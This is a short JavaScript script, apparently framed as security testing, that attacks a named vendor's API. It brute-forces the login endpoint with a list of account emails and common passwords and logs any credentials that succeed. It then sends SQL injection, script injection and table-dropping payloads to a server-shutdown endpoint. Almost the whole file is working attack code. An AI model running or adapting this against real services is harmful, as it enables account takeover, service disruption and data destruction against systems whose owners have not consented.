const axios = require('axios');

// Replace these with Blocksi test endpoints and wordlists
const API_BASE = 'https://test.blocksi.com/api';
const USERS = ['admin@blocksi.com', 'user@blocksi.com'];
const PASSWORDS = ['123456', 'admin', 'password', 'letmein'];

// Brute-force login test
async function bruteForceLogin() {
    for (const email of USERS) {
        for (const password of PASSWORDS) {
            try {
                const response = await axios.post(`${API_BASE}/auth/login`, { email, password });
                if (response.data.accessToken) {
                    console.log(`Potential valid login: ${email}:${password}`);
                }
            } catch (err) {
                console.log(`Attempt failed for ${email}:${password}: ${err.response?.status}`);
            }
        }
    }
}

// Input fuzzing test
async function fuzzEndpoint() {
    const fuzzData = [
        { serverId: "' OR '1'='1" },
        { serverId: "<script>alert(1)</script>" },
        { serverId: "1; DROP TABLE servers;" }
    ];
    for (const data of fuzzData) {
        try {
            const response = await axios.post(`${API_BASE}/servers/shutdown`, data);
            console.log(`Fuzz input ${JSON.stringify(data)}: ${response.status}`);
        } catch (err) {
            console.log(`Fuzz input failed: ${JSON.stringify(data)} - ${err.response?.status}`);
        }
    }
}

// Main routine
(async function main() {
    await bruteForceLogin();
    await fuzzEndpoint();
})();